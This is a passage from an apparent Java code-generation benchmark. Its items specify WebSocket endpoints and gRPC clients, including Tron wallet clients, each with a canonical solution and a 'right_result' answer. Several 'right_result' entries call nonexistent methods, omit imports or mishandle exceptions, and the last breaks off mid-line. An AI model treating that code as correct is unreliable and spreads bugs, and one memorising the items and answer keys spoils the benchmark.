    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles client connections, messages, and broadcasts messages to connected clients.\n\nClass Description: WebSocketServer is a Java EE WebSocket endpoint that manages client connections, processes incoming messages, and provides functionality for sending messages to single or multiple clients. It uses annotations to define WebSocket lifecycle methods and maintains connection state.\n\nAttributes:\n- session: [Session] - The current WebSocket session for this endpoint instance\n- webSockets: [CopyOnWriteArraySet<WebSocketServer>] - Thread-safe set of all active WebSocket connections\n- sessionPool: [Map<String, Session>] - Mapping of user IDs to their corresponding WebSocket sessions\n\nMethods:\n- onOpen: [onOpen(Session session, @PathParam(\"userId\") String userId)] -> [void] - Handles new WebSocket connections and stores the session\n- onClose: [onClose()] -> [void] - Handles WebSocket connection closure and cleans up resources\n- onMessage: [onMessage(String message)] -> [void] - Processes incoming messages from clients\n- onError: [onError(Session session, Throwable error)] -> [void] - Handles WebSocket communication errors\n- sendAllMessage: [sendAllMessage(String message)] -> [void] - Broadcasts a message to all connected clients\n- sendOneMessage: [sendOneMessage(String userId, String message)] -> [void] - Sends a message to a specific client identified by user ID\n- sendMoreMessage: [sendMoreMessage(String[] userIds, String message)] -> [void] - Sends a message to multiple specified clients",
    "Canonical_solution": "import lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\n\nimport javax.websocket.*;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.CopyOnWriteArraySet;\n\n@Component\n@Slf4j\n@ServerEndpoint(\"/websocket/{userId}\")\npublic class WebSocketServer {\n\n    private Session session;\n    private static final CopyOnWriteArraySet<WebSocketServer> webSockets = new CopyOnWriteArraySet<>();\n    private static final Map<String, Session> sessionPool = new HashMap<String, Session>();\n\n    @OnOpen\n    public void onOpen(Session session, @PathParam(value = \"userId\") String userId) {\n        try {\n            this.session = session;\n            webSockets.add(this);\n            sessionPool.put(userId, session);\n            log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011\u6709\u65b0\u7684\u8fde\u63a5\uff0c\u603b\u6570\u4e3a:\" + webSockets.size());\n        } catch (Exception e) {\n        }\n    }\n\n    @OnClose\n    public void onClose() {\n        try {\n            webSockets.remove(this);\n            log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011\u8fde\u63a5\u65ad\u5f00\uff0c\u603b\u6570\u4e3a:\" + webSockets.size());\n        } catch (Exception e) {\n        }\n    }\n\n    @OnMessage\n    public void onMessage(String message) {\n        log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011\u6536\u5230\u5ba2\u6237\u7aef\u6d88\u606f:\" + message);\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error) {\n        error.printStackTrace();\n    }\n\n    public void sendAllMessage(String message) {\n        log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011\u5e7f\u64ad\u6d88\u606f:\" + message);\n        for (WebSocketServer webSocket : webSockets) {\n            try {\n                if (webSocket.session.isOpen()) {\n                    webSocket.session.getAsyncRemote().sendText(message);\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void sendOneMessage(String userId, String message) {\n        Session session = sessionPool.get(userId);\n        if (session != null && session.isOpen()) {\n            try {\n                log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011 \u5355\u70b9\u6d88\u606f:\" + message);\n                session.getAsyncRemote().sendText(message);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void sendMoreMessage(String[] userIds, String message) {\n        for (String userId : userIds) {\n            Session session = sessionPool.get(userId);\n            if (session != null && session.isOpen()) {\n                try {\n                    log.info(\"\u3010websocket\u670d\u52a1\u7aef\u3011 \u5355\u70b9\u6d88\u606f:\" + message);\n                    session.getAsyncRemote().sendText(message);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "import javax.websocket.OnClose;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.util.Map;\nimport java.util.concurrent.CopyOnWriteArraySet;\nimport java.util.concurrent.ConcurrentHashMap;\n\n@ServerEndpoint(\"/websocket\")\npublic class WebSocketServer {\n    private Session session;\n    private static final CopyOnWriteArraySet<WebSocketServer> webSockets = new CopyOnWriteArraySet<>();\n    private static final Map<String, Session> sessionPool = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(Session session, @PathParam(\"userId\") String userId) {\n        this.session = session;\n        webSockets.add(this);\n        sessionPool.put(userId, session);\n    }\n\n    @OnClose\n    public void onClose() {\n        webSockets.remove(this);\n        sessionPool.values().remove(session);\n    }\n\n    @OnMessage\n    public void onMessage(String message) {\n        // Process incoming message\n    }\n\n    @OnError\n    public void onError(Session session, Throwable error) {\n        // Handle error\n    }\n\n    public void sendAllMessage(String message) {\n        for (WebSocketServer client : webSockets) {\n            try {\n                client.session.getBasicRemote().sendText(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void sendOneMessage(String userId, String message) {\n        Session session = sessionPool.get(userId);\n        if (session != null) {\n            try {\n                session.getBasicRemote().sendText(message);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void sendMoreMessage(String[] userIds, String message) {\n        for (String userId : userIds) {\n            Session session = sessionPool.get(userId);\n            if (session != null) {\n                try {\n                    session.getBasicRemote().sendText(message);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 486,
    "Instruction": "Task Description: Create a WebSocket server endpoint class in Java that handles real-time communication between multiple clients, specifically for broadcasting figures and binary data snapshots to connected peers.\n\nClass Description: The Whiteboard class is a WebSocket server endpoint that manages client connections and facilitates real-time data broadcasting. It maintains a list of connected peers and provides methods to handle connection events (open/close) and message broadcasting (figures and binary data).\n\nAttributes:\n- LOGGER: Logger - Used for logging server activities and debugging information\n- PRESENT: Object - A dummy object used as a value in the peers ConcurrentMap\n- peers: ConcurrentMap<Session, Object> - Thread-safe collection storing all connected client sessions\n\nMethods:\n- onOpen(Session peer) -> void - Handles new WebSocket connections by adding the client session to the peers map\n- onClose(Session peer) -> void - Handles WebSocket disconnections by removing the client session from the peers map\n- broadcastFigure(Figure figure, Session session) -> void - Broadcasts a Figure object to all connected clients except the sender\n- broadcastSnapshot(ByteBuffer data, Session session) -> void - Broadcasts binary data to all connected clients except the sender",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\nimport javax.websocket.EncodeException;\nimport javax.websocket.OnClose;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\n\n@ServerEndpoint(value = \"/websocket\",\n    encoders = { FigureEncoder.class },\n    decoders = { FigureDecoder.class })\npublic class Whiteboard {\n\n    private static final Logger LOGGER = Logger.getLogger(Whiteboard.class.getName());\n    private static final Object PRESENT = new Object();\n    private static final ConcurrentMap<Session, Object> peers = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(Session peer) {\n        peers.put(peer, PRESENT);\n    }\n\n    @OnClose\n    public void onClose(Session peer) {\n        peers.remove(peer);\n    }\n\n    @OnMessage\n    public void broadcastFigure(Figure figure, Session session) throws IOException, EncodeException {\n        LOGGER.log(Level.INFO, \"boradcastFigure: {0}\", figure);\n        for (Session peer : session.getOpenSessions()) {\n            if (!peer.equals(session)) {\n                peer.getBasicRemote().sendObject(figure);\n            }\n        }\n    }\n\n    @OnMessage\n    public void broadcastSnapshot(ByteBuffer data, Session session) throws IOException {\n        LOGGER.log(Level.INFO, \"broadcastBinary: {0}\", data);\n        for (Session peer : session.getOpenSessions()) {\n            if (!peer.equals(session)) {\n                peer.getBasicRemote().sendBinary(data);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "import javax.websocket.OnClose;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.ServerEndpoint;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\n@ServerEndpoint(\"/whiteboard\")\npublic class Whiteboard {\n    private static final Logger LOGGER = LoggerFactory.getLogger(Whiteboard.class);\n    private static final Object PRESENT = new Object();\n    private final ConcurrentMap<Session, Object> peers = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(Session peer) {\n        peers.put(peer, PRESENT);\n        LOGGER.info(\"Client connected: {}\", peer.getId());\n    }\n\n    @OnClose\n    public void onClose(Session peer) {\n        peers.remove(peer);\n        LOGGER.info(\"Client disconnected: {}\", peer.getId());\n    }\n\n    public void broadcastFigure(Figure figure, Session session) {\n        for (Session peer : peers.keySet()) {\n            if (!peer.equals(session)) {\n                try {\n                    peer.getBasicRemote().sendObject(figure);\n                } catch (Exception e) {\n                    LOGGER.error(\"Error broadcasting figure to client: {}\", peer.getId(), e);\n                }\n            }\n        }\n    }\n\n    public void broadcastSnapshot(ByteBuffer data, Session session) {\n        for (Session peer : peers.keySet()) {\n            if (!peer.equals(session)) {\n                try {\n                    peer.getBasicRemote().sendBinary(data);\n                } catch (Exception e) {\n                    LOGGER.error(\"Error broadcasting snapshot to client: {}\", peer.getId(), e);\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 499,
    "Instruction": "Task Description: Create a gRPC client class in Java that connects to a gRPC server for executing GraphQL queries and handling responses asynchronously.\n\nClass Description: The GraphQlGrpcClient class establishes a connection to a gRPC server, provides functionality to execute GraphQL queries, and handles server responses asynchronously. It manages the gRPC channel lifecycle and provides cleanup methods.\n\nAttributes:\n- channel: [ManagedChannel] - The gRPC communication channel to the server\n- stub: [GraphQlServiceGrpc.GraphQlServiceStub] - The asynchronous gRPC stub for making service calls\n- ON_COMPLETE: [CountDownLatch] - Synchronization aid to wait for response completion\n- logger: [Logger] - Logger instance for logging client activities\n\nMethods:\n- GraphQlGrpcClient(String host, int port) -> [Constructor] - Creates a client instance with specified host and port, using plaintext connection\n- GraphQlGrpcClient(ManagedChannel channel) -> [Constructor] - Creates a client instance with an existing channel\n- shutdown() -> [void] - Shuts down the channel gracefully with a 5-second timeout\n- query(String query) -> [void] - Executes a GraphQL query asynchronously and logs responses/errors",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.examples.graphql.GraphQlRequest;\nimport io.grpc.examples.graphql.GraphQlResponse;\nimport io.grpc.examples.graphql.GraphQlServiceGrpc;\nimport io.grpc.stub.StreamObserver;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class GraphQlGrpcClient {\n  private static final Logger logger = Logger.getLogger(GraphQlGrpcClient.class.getName());\n\n  private final ManagedChannel channel;\n  private final GraphQlServiceGrpc.GraphQlServiceStub stub;\n  private final CountDownLatch ON_COMPLETE = new CountDownLatch(1);\n\n  public GraphQlGrpcClient(String host, int port) {\n    this(ManagedChannelBuilder.forAddress(host, port).usePlaintext().build());\n  }\n\n  GraphQlGrpcClient(ManagedChannel channel) {\n    this.channel = channel;\n    stub = GraphQlServiceGrpc.newStub(channel);\n  }\n\n  public void shutdown() throws InterruptedException {\n    channel.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n  }\n\n  public void query(String query) {\n    GraphQlRequest request =\n        GraphQlRequest.newBuilder().build().newBuilder().setQuery(query).build();\n\n    stub.execute(\n        request,\n        new StreamObserver<GraphQlResponse>() {\n          @Override\n          public void onNext(GraphQlResponse value) {\n            logger.info(\"onNext: \" + value);\n          }\n\n          @Override\n          public void onError(Throwable t) {\n            logger.log(Level.WARNING, t, () -> \"onError\");\n            ON_COMPLETE.countDown();\n          }\n\n          @Override\n          public void onCompleted() {\n            logger.info(\"onCompleted\");\n            ON_COMPLETE.countDown();\n          }\n        });\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.StatusRuntimeException;\nimport io.grpc.stub.StreamObserver;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class GraphQlGrpcClient {\n    private final ManagedChannel channel;\n    private final GraphQlServiceGrpc.GraphQlServiceStub stub;\n    private final CountDownLatch ON_COMPLETE = new CountDownLatch(1);\n    private static final Logger logger = LoggerFactory.getLogger(GraphQlGrpcClient.class);\n\n    public GraphQlGrpcClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port)\n                .usePlaintext()\n                .build();\n        this.stub = GraphQlServiceGrpc.newStub(channel);\n    }\n\n    public GraphQlGrpcClient(ManagedChannel channel) {\n        this.channel = channel;\n        this.stub = GraphQlServiceGrpc.newStub(channel);\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.shutdownGracefully().await(5, java.util.concurrent.TimeUnit.SECONDS);\n        }\n    }\n\n    public void query(String query) {\n        GraphQlRequest request = GraphQlRequest.newBuilder().setQuery(query).build();\n        stub.executeQuery(request, new StreamObserver<GraphQlResponse>() {\n            @Override\n            public void onNext(GraphQlResponse response) {\n                logger.info(\"Received response: {}\", response.getData());\n            }\n\n            @Override\n            public void onError(Throwable t) {\n                logger.error(\"Error occurred: \", t);\n            }\n\n            @Override\n            public void onCompleted() {\n                logger.info(\"Query completed\");\n                ON_COMPLETE.countDown();\n            }\n        });\n    }\n}"
  },
  {
    "Task_id": 500,
    "Instruction": "Task Description: Create a gRPC client class in Java that connects to both full and solidity nodes of a blockchain network, allowing for transaction creation and broadcasting.\n\nClass Description: The GrpcClient class establishes gRPC connections to blockchain nodes (full and solidity) and provides methods for transaction operations. It manages channel lifecycle and provides blocking stub interfaces for synchronous communication.\n\nAttributes:\n- channelFull: [ManagedChannel] - Channel for connection to the full node\n- channelSolidity: [ManagedChannel] - Channel for connection to the solidity node\n- blockingStubFull: [WalletGrpc.WalletBlockingStub] - Blocking stub for full node operations\n- blockingStubSolidity: [WalletSolidityGrpc.WalletSolidityBlockingStub] - Blocking stub for solidity node operations\n- blockingStubExtension: [WalletExtensionGrpc.WalletExtensionBlockingStub] - Blocking stub for extension operations\n\nMethods:\n- GrpcClient(String fullnode, String soliditynode) -> [void] - Constructor that initializes connections to specified nodes\n- shutdown() -> [void] - Gracefully shuts down all active channels\n- createTransaction(AccountUpdateContract contract) -> [Transaction] - Creates a transaction using the full node stub\n- broadcastTransaction(Transaction signaturedTransaction) -> [boolean] - Broadcasts a signed transaction and returns operation result",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.api.WalletGrpc;\nimport org.tron.api.WalletSolidityGrpc;\nimport org.tron.api.WalletExtensionGrpc;\n\npublic class GrpcClient {\n\n  private ManagedChannel channelFull = null;\n  private ManagedChannel channelSolidity = null;\n  private WalletGrpc.WalletBlockingStub blockingStubFull = null;\n  private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity = null;\n  private WalletExtensionGrpc.WalletExtensionBlockingStub blockingStubExtension = null;\n\n  public GrpcClient(String fullnode, String soliditynode) {\n    if (!(fullnode.isEmpty())) {\n      channelFull = ManagedChannelBuilder.forTarget(fullnode)\n          .usePlaintext()\n          .build();\n      blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n    }\n    if (!(soliditynode.isEmpty())) {\n      channelSolidity = ManagedChannelBuilder.forTarget(soliditynode)\n          .usePlaintext()\n          .build();\n      blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n      blockingStubExtension = WalletExtensionGrpc.newBlockingStub(channelSolidity);\n    }\n  }\n\n  public void shutdown() throws InterruptedException {\n    if (channelFull != null) {\n      channelFull.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n    }\n    if (channelSolidity != null) {\n      channelSolidity.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n    }\n  }\n\n  public Transaction createTransaction(AccountUpdateContract contract) {\n    return blockingStubFull.updateAccount(contract);\n  }\n\n  public boolean broadcastTransaction(Transaction signaturedTransaction) {\n    GrpcAPI.Return response = blockingStubFull.broadcastTransaction(signaturedTransaction);\n    return response.getResult();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.StatusRuntimeException;\nimport java.util.concurrent.TimeUnit;\n\npublic class GrpcClient {\n    private ManagedChannel channelFull;\n    private ManagedChannel channelSolidity;\n    private WalletGrpc.WalletBlockingStub blockingStubFull;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity;\n    private WalletExtensionGrpc.WalletExtensionBlockingStub blockingStubExtension;\n\n    public GrpcClient(String fullnode, String soliditynode) {\n        this.channelFull = ManagedChannelBuilder.forTarget(fullnode)\n                .usePlaintext()\n                .build();\n        this.blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n\n        this.channelSolidity = ManagedChannelBuilder.forTarget(soliditynode)\n                .usePlaintext()\n                .build();\n        this.blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n\n        this.blockingStubExtension = WalletExtensionGrpc.newBlockingStub(channelFull);\n    }\n\n    public void shutdown() {\n        if (channelFull != null) {\n            channelFull.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n        if (channelSolidity != null) {\n            channelSolidity.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n        }\n    }\n\n    public Transaction createTransaction(AccountUpdateContract contract) {\n        try {\n            return blockingStubFull.createTransaction(contract);\n        } catch (StatusRuntimeException e) {\n            System.err.println(\"Error creating transaction: \" + e.getStatus().getDescription());\n            return null;\n        }\n    }\n\n    public boolean broadcastTransaction(Transaction signaturedTransaction) {\n        try {\n            return blockingStubSolidity.broadcastTransaction(signaturedTransaction);\n        } catch (StatusRuntimeException e) {\n            System.err.println(\"Error broadcasting transaction: \" + e.getStatus().getDescription());\n            return false;\n        }\n    }\n}"
  },
  {
    "Task_id": 501,
    "Instruction": "Task Description: Create a gRPC client class in Java for interacting with a Tron blockchain wallet service, implementing various wallet operations through gRPC calls.\n\nClass Description: The WalletGrpcClient class provides a Java interface to interact with a Tron blockchain node's wallet service using gRPC. It handles connection management and provides methods for account queries, transaction creation, and blockchain data retrieval.\n\nAttributes:\n- channel: [ManagedChannel] - The gRPC communication channel to the server\n- walletBlockingStub: [WalletGrpc.WalletBlockingStub] - The blocking stub for making synchronous RPC calls\n\nMethods:\n- WalletGrpcClient(String host, int port) - Constructor - Creates a client connecting to specified host and port\n- WalletGrpcClient(String host) - Constructor - Creates a client connecting to specified host (using target format)\n- shutdown() -> void - Shuts down the channel with 5-second timeout\n- queryAccount(byte[] address) -> Account - Queries account information by address\n- createTransaction(TransferContract contract) -> Transaction - Creates a transfer transaction\n- createTransferAssetTransaction(TransferAssetContract contract) -> Transaction - Creates an asset transfer transaction\n- createParticipateAssetIssueTransaction(ParticipateAssetIssueContract contract) -> Transaction - Creates an asset participation transaction\n- createAssetIssue(AssetIssueContract contract) -> Transaction - Creates an asset issuance transaction\n- voteWitnessAccount(VoteWitnessContract contract) -> Transaction - Creates a witness voting transaction\n- createWitness(WitnessCreateContract contract) -> Transaction - Creates a witness creation transaction\n- broadcastTransaction(Transaction signedTransaction) -> boolean - Broadcasts a signed transaction to network\n- getBlock(long blockNum) -> Block - Retrieves block by number (or latest if negative)\n- listNodes() -> Optional<NodeList> - Lists connected nodes\n- getAssetIssueByAccount(byte[] address) -> Optional<AssetIssueList> - Gets assets issued by account\n- getAssetIssueByName(String assetName) -> AssetIssueContract - Gets asset by name\n- getAssetIssueListByName(String assetName) -> Optional<AssetIssueList> - Gets asset list by name\n- getAssetIssueById(String assetId) -> AssetIssueContract - Gets asset by ID",
    "Canonical_solution": "import com.google.protobuf.ByteString;\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.Optional;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.api.GrpcAPI.AssetIssueList;\nimport org.tron.api.GrpcAPI.BytesMessage;\nimport org.tron.api.GrpcAPI.EmptyMessage;\nimport org.tron.api.GrpcAPI.NodeList;\nimport org.tron.api.GrpcAPI.NumberMessage;\nimport org.tron.api.GrpcAPI.Return;\nimport org.tron.api.WalletGrpc;\nimport org.tron.protos.Protocol.Account;\nimport org.tron.protos.Protocol.Block;\nimport org.tron.protos.Protocol.Transaction;\nimport org.tron.protos.contract.AssetIssueContractOuterClass.AssetIssueContract;\nimport org.tron.protos.contract.AssetIssueContractOuterClass.ParticipateAssetIssueContract;\nimport org.tron.protos.contract.AssetIssueContractOuterClass.TransferAssetContract;\nimport org.tron.protos.contract.BalanceContract.TransferContract;\nimport org.tron.protos.contract.WitnessContract.VoteWitnessContract;\nimport org.tron.protos.contract.WitnessContract.WitnessCreateContract;\n\npublic class WalletGrpcClient {\n\n  private final ManagedChannel channel;\n  private final WalletGrpc.WalletBlockingStub walletBlockingStub;\n\n  public WalletGrpcClient(String host, int port) {\n    channel = ManagedChannelBuilder.forAddress(host, port)\n        .usePlaintext()\n        .build();\n    walletBlockingStub = WalletGrpc.newBlockingStub(channel);\n  }\n\n  public WalletGrpcClient(String host) {\n    channel = ManagedChannelBuilder.forTarget(host)\n        .usePlaintext()\n        .build();\n    walletBlockingStub = WalletGrpc.newBlockingStub(channel);\n  }\n\n  public void shutdown() throws InterruptedException {\n    channel.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n  }\n\n  public Account queryAccount(byte[] address) {\n    ByteString addressByteString = ByteString.copyFrom(address);\n    Account request = Account.newBuilder().setAddress(addressByteString).build();\n    return walletBlockingStub.getAccount(request);\n  }\n\n  public Transaction createTransaction(TransferContract contract) {\n    return walletBlockingStub.createTransaction(contract);\n  }\n\n  public Transaction createTransferAssetTransaction(TransferAssetContract contract) {\n    return walletBlockingStub.transferAsset(contract);\n  }\n\n  public Transaction createParticipateAssetIssueTransaction(\n      ParticipateAssetIssueContract contract) {\n    return walletBlockingStub.participateAssetIssue(contract);\n  }\n\n  public Transaction createAssetIssue(AssetIssueContract contract) {\n    return walletBlockingStub.createAssetIssue(contract);\n  }\n\n  public Transaction voteWitnessAccount(VoteWitnessContract contract) {\n    return walletBlockingStub.voteWitnessAccount(contract);\n  }\n\n  public Transaction createWitness(WitnessCreateContract contract) {\n    return walletBlockingStub.createWitness(contract);\n  }\n\n  public boolean broadcastTransaction(Transaction signedTransaction) {\n    Return response = walletBlockingStub.broadcastTransaction(signedTransaction);\n    return response.getResult();\n  }\n\n  public Block getBlock(long blockNum) {\n    if (blockNum < 0) {\n      return walletBlockingStub.getNowBlock(EmptyMessage.newBuilder().build());\n    }\n    NumberMessage.Builder builder = NumberMessage.newBuilder();\n    builder.setNum(blockNum);\n    return walletBlockingStub.getBlockByNum(builder.build());\n  }\n\n  public Optional<NodeList> listNodes() {\n    NodeList nodeList = walletBlockingStub\n        .listNodes(EmptyMessage.newBuilder().build());\n    if (nodeList != null) {\n      return Optional.of(nodeList);\n    }\n    return Optional.empty();\n  }\n\n  public Optional<AssetIssueList> getAssetIssueByAccount(byte[] address) {\n    ByteString addressByteString = ByteString.copyFrom(address);\n    Account request = Account.newBuilder().setAddress(addressByteString).build();\n    AssetIssueList assetIssueList = walletBlockingStub\n        .getAssetIssueByAccount(request);\n    if (assetIssueList != null) {\n      return Optional.of(assetIssueList);\n    }\n    return Optional.empty();\n  }\n\n  public AssetIssueContract getAssetIssueByName(String assetName) {\n    ByteString assetNameBs = ByteString.copyFrom(assetName.getBytes());\n    BytesMessage request = BytesMessage.newBuilder().setValue(assetNameBs).build();\n    return walletBlockingStub.getAssetIssueByName(request);\n  }\n\n  public Optional<AssetIssueList> getAssetIssueListByName(String assetName) {\n    ByteString assetNameBs = ByteString.copyFrom(assetName.getBytes());\n    BytesMessage request = BytesMessage.newBuilder().setValue(assetNameBs).build();\n\n    AssetIssueList assetIssueList = walletBlockingStub\n        .getAssetIssueListByName(request);\n    if (assetIssueList != null) {\n      return Optional.of(assetIssueList);\n    }\n    return Optional.empty();\n  }\n\n  public AssetIssueContract getAssetIssueById(String assetId) {\n    ByteString assetIdBs = ByteString.copyFrom(assetId.getBytes());\n    BytesMessage request = BytesMessage.newBuilder().setValue(assetIdBs).build();\n    return walletBlockingStub.getAssetIssueById(request);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.StatusRuntimeException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.Optional;\nimport java.util.List;\nimport java.util.ArrayList;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.nio.ByteBuffer;\nimport com.google.protobuf.ByteString;\nimport org.tron.api.GrpcAPI;\nimport org.tron.api.WalletGrpc;\nimport org.tron.protos.Protocol.Account;\nimport org.tron.protos.Protocol.Transaction;\nimport org.tron.protos.Protocol.Block;\nimport org.tron.protos.Protocol.NodeList;\nimport org.tron.protos.Protocol.AssetIssueList;\nimport org.tron.protos.Protocol.AssetIssue;\nimport org.tron.protos.Contract.TransferContract;\nimport org.tron.protos.Contract.TransferAssetContract;\nimport org.tron.protos.Contract.ParticipateAssetIssueContract;\nimport org.tron.protos.Contract.AssetIssueContract;\nimport org.tron.protos.Contract.VoteWitnessContract;\nimport org.tron.protos.Contract.WitnessCreateContract;\nimport org.tron.protos.Response;\n\npublic class WalletGrpcClient {\n    private ManagedChannel channel;\n    private WalletGrpc.WalletBlockingStub walletBlockingStub;\n\n    public WalletGrpcClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port)\n                .usePlaintext()\n                .build();\n        this.walletBlockingStub = WalletGrpc.newBlockingStub(channel);\n    }\n\n    public WalletGrpcClient(String host) {\n        this.channel = ManagedChannelBuilder.forTarget(host)\n                .usePlaintext()\n                .build();\n        this.walletBlockingStub = WalletGrpc.newBlockingStub(channel);\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.shutdownNow();\n            try {\n                channel.awaitTermination(5, TimeUnit.SECONDS);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    public Account queryAccount(byte[] address) {\n        GrpcAPI.BytesMessage request = GrpcAPI.BytesMessage.newBuilder()\n                .setValue(ByteString.copyFrom(address))\n                .build();\n        try {\n            GrpcAPI.AccountNetMessage response = walletBlockingStub.getAccount(request);\n            return response.getAccount();\n        } catch (StatusRuntimeException e) {\n            throw new RuntimeException(\"Failed to query account: \" + e.getMessage(), e);\n        }\n    }\n\n    public Transaction createTransaction(TransferContract contract) {\n        try {\n            return walletBlockingStub.createTransaction(contract);\n        } catch (StatusRuntimeException e) {\n            throw new RuntimeException(\"Failed to create transaction: \" + e.getMessage(), e);\n        }\n    }\n\n    public Transaction createTransferAssetTransaction(TransferAssetContract contract) {\n        try {\n            return walletBlockingStub.createTransferAssetTransaction(contract);\n        } catch (StatusRuntimeException e) {\n            throw new RuntimeException(\"Failed to create transfer asset transaction: \" + e.getMessage(), e);\n        }\n    }\n\n    public Transaction createParticipateAssetIssueTransaction(ParticipateAssetIssueContract contract) {\n        try {\n            return walletBlockingStub.createParticipateAssetIssueTransaction(contract);\n        } catch (StatusRuntimeException e) {\n            throw new RuntimeException(\"Failed to create participate asset issue transaction: \" + e.getMessage(), e);\n        }\n    }\n\n    public Transaction createAssetIssue(AssetIssueContract contract) {\n        try {\n            return walletBlockingStub.createAssetIssue(contract);\n        } catch (StatusRuntimeException e) {\n            throw new RuntimeException(\"Failed to create asset issue: \" + e.getMessage(), e);\n        }\n    }\n\n    public Transaction voteWitnessAccount(VoteWitnessContract contract) {\n        try {\n            return walletBlockingStub.voteWitnessAccount(contract);\n        } catch (StatusRuntimeException e) {\n            throw new RuntimeException(\"Failed to vote witness account: \" + e.getMessage(), e);\n        }\n    }\n\n    public Transaction createWitness(WitnessCreateContract contract) {\n        try {\n            return walletBlockingStub.createWitness(contract);\n        } catch (StatusRuntimeException e) {\n            throw new RuntimeException(\"Failed to create witness: \" + e.getMessage(), e);\n        }\n    }\n\n    public boolean broadcastTransaction(Transaction signedTransaction) {\n        try {\n            Response.TransactionExtention response = walletBlockingStub.broadcastTransaction(signedTransaction);\n            return response.getTransaction().hasHash();\n        } catch (StatusRuntimeException e) {\n            throw new RuntimeException(\"Failed to broadcast transaction: \" + e.getMessage(), e);\n        }\n    }\n\n    public Block getBlock(long blockNum) {\n        GrpcAPI.NumberMessage request = GrpcAPI.NumberMessage.newBuilder()\n                .setNum(blockNum < 0 ? 0 : blockNum)\n                .build();\n        try {\n            GrpcAPI.BlockMessage response = walletBlockingStub.getBlockByNum(request);\n            return response.getBlock();\n        } catch (StatusRuntimeException e) {\n            throw new RuntimeException(\"Failed to get block: \" + e.getMessage(), e);\n        }\n    }\n\n    public Optional<NodeList> listNodes() {\n        try {\n            GrpcAPI.NumberMessage request = GrpcAPI.NumberMessage.newBuilder()\n                    .setNum(0)\n                    .build();\n            GrpcAPI.NodeList response = walletBlockingStub.listNodes(request);\n            return Optional.ofNullable(response);\n        } catch (StatusRuntimeException e) {\n            throw new 